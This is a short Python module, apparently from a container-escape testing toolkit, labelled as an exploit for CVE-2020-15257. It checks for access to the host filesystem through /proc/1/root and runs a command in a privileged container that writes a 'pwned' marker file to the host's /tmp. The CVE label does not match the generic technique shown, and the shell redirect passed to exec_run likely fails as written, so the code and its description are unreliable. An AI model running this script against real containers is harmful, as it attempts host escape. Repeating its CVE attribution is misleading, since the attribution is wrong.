# attacks/cve_2020_15257.py

import os

def is_vulnerable(env_info):
    """
    Check for basic conditions where CVE-2020-15257 may apply.
    It typically requires a privileged container running as root.
    We'll heuristically check if /proc/1/root exists and points to host FS.
    """
    return os.path.exists("/proc/1/root/etc/hostname")

def run(container):
    """
    Attempt to overwrite a file on the host via /proc/1/root path.
    This simulates an escape via privileged container access.
    """
    print(f"[CVE-2020-15257] Trying to overwrite /proc/1/root/tmp/pwned.txt")

    try:
        result = container.exec_run("echo 'owned by container' > /proc/1/root/tmp/pwned.txt", privileged=True)
        if result.exit_code == 0:
            return "Exploit attempt complete: wrote to host /tmp/pwned.txt via /proc/1/root"
        else:
            return f"Exploit failed: {result.output.decode()}"
    except Exception as e:
        return f"Exploit failed with exception: {str(e)}"
